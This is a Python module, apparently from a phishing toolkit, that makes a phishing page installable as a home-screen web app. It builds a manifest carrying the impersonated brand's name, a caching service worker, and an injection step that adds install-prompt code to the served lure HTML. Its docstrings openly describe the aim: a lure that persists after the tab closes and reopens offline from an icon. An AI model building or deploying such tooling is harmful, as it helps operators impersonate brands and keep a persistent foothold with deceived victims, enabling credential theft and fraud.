# ============================================================================
# FILE: core/pwa.py
# ============================================================================
"""Installable lure: a home-screen icon that survives the browser tab closing.

A phishing page has one life: the tab closes and the link has to be re-sent. An installable
page does not - once it is added to the home screen it opens again from the icon, offline, with
no message and no link. That is the whole point, and it is a normal, documented web-platform
feature: a manifest, a service worker, and a page that asks.

What it is NOT is a browser exploit. The install prompt needs a real user gesture and a
top-level secure context, so it works on a campaign served over HTTPS from a real hostname and
is silently unavailable otherwise. This module says so instead of pretending.

Injection is a small post-processing step on the served HTML: a `<link rel="manifest">` and the
registration snippet, both scoped to the served document, both removable.
"""
import html
import json

__all__ = ["manifest", "service_worker", "inject", "MANIFEST_PATH", "SW_PATH",
           "install_hint", "describe"]

MANIFEST_PATH = "/manifest.webmanifest"
SW_PATH = "/sw.js"


def _js_squote(value):
    """A JS single-quoted string literal, safe inside an inline <script>.

    Quotes and backslashes are escaped and `<`, `>`, `&` are written as unicode
    escapes, so a path containing `</script>` cannot close the element and inject
    markup. U+2028/U+2029 (JS line terminators) are escaped too.
    """
    out = []
    for ch in str(value):
        if ch == "\\":
            out.append("\\\\")
        elif ch == "'":
            out.append("\\'")
        elif ch in "<>&":
            out.append(f"\\u{ord(ch):04x}")
        elif ch == "\n":
            out.append("\\n")
        elif ch == "\r":
            out.append("\\r")
        elif ch in ("\u2028", "\u2029"):
            out.append(f"\\u{ord(ch):04x}")
        else:
            out.append(ch)
    return "'" + "".join(out) + "'"


def manifest(name="", short_name="", start_url="/", display="standalone",
             background="#ffffff", theme="#0f6cbd", icons=None):
    """The web app manifest.

    `name` is what the home screen shows, so it should be the brand the lure pretends to be -
    the operator passes it, and an empty one is refused because an unnamed icon is a tell.
    """
    if not str(name or "").strip():
        raise ValueError("a manifest needs a name (the home screen shows it)")
    short = (short_name or name)[:12]
    return {
        "name": str(name),
        "short_name": str(short),
        "start_url": start_url or "/",
        "scope": "/",
        "display": display,
        "background_color": background,
        "theme_color": theme,
        "icons": icons or [
            {"src": "/icon-192.png", "sizes": "192x192", "type": "image/png",
             "purpose": "any maskable"},
            {"src": "/icon-512.png", "sizes": "512x512", "type": "image/png",
             "purpose": "any maskable"},
        ],
    }


def service_worker(cache_name="app-shell", assets=None):
    """A minimal cache-first worker: the shell opens offline after the first visit."""
    assets = list(assets or ["/", "/index.html"])
    return (
        "/* a cache-first shell: the installed icon opens with no network */\n"
        f"var CACHE = {json.dumps(str(cache_name))};\n"
        f"var ASSETS = {json.dumps(assets)};\n"
        "self.addEventListener('install', function (e) {\n"
        "  e.waitUntil(caches.open(CACHE).then(function (c) { return c.addAll(ASSETS); })\n"
        "    .then(function () { return self.skipWaiting(); }));\n"
        "});\n"
        "self.addEventListener('activate', function (e) {\n"
        "  e.waitUntil(self.clients.claim());\n"
        "});\n"
        "self.addEventListener('fetch', function (e) {\n"
        "  if (e.request.method !== 'GET') { return; }\n"
        "  e.respondWith(caches.match(e.request).then(function (hit) {\n"
        "    return hit || fetch(e.request).then(function (res) {\n"
        "      var copy = res.clone();\n"
        "      caches.open(CACHE).then(function (c) { c.put(e.request, copy); });\n"
        "      return res;\n"
        "    }).catch(function () { return caches.match('/'); });\n"
        "  }));\n"
        "});\n"
    )


def inject(html_text, manifest_path=MANIFEST_PATH, sw_path=SW_PATH, prompt=True):
    """Add the manifest link, the registration and (optionally) an install button.

    Idempotent: injecting twice leaves one copy, so a page that already opted in is not
    double-tagged.
    """
    text = str(html_text or "")
    if manifest_path in text:
        return text
    href = html.escape(str(manifest_path), quote=True)
    head = (f'<link rel="manifest" href="{href}">'
            f'<meta name="theme-color" content="#0f6cbd">')
    script = (
        "<script>(function(){"
        "if('serviceWorker' in navigator){"
        f"navigator.serviceWorker.register({_js_squote(sw_path)}).catch(function(){{}});"
        "}"
        + ("var d=null;window.addEventListener('beforeinstallprompt',function(e){"
           "e.preventDefault();d=e;var b=document.getElementById('pwa-install');"
           "if(b){b.style.display='block';b.onclick=function(){d.prompt();};}});"
           if prompt else "")
        + "})();</script>")
    if "</head>" in text:
        text = text.replace("</head>", head + "</head>", 1)
    else:
        text = head + text
    if "</body>" in text:
        text = text.replace("</body>", script + "</body>", 1)
    else:
        text = text + script
    return text


def install_hint(label="Add to home screen"):
    """The button a page can show; the browser decides whether the prompt is available."""
    return (f'<button id="pwa-install" style="display:none">{html.escape(str(label))}</button>')


def describe(facts):
    lines = [f"pwa: {facts.get('name')} ({facts.get('display')}), start {facts.get('start_url')}"]
    lines.append(f"  manifest: {facts.get('manifest_path')}  worker: {facts.get('sw_path')}")
    if not facts.get("secure_context"):
        lines.append("  ! an install prompt needs a real user gesture and a top-level secure "
                     "context: over plain HTTP the icon will not be offered")
    return "\n".join(lines)
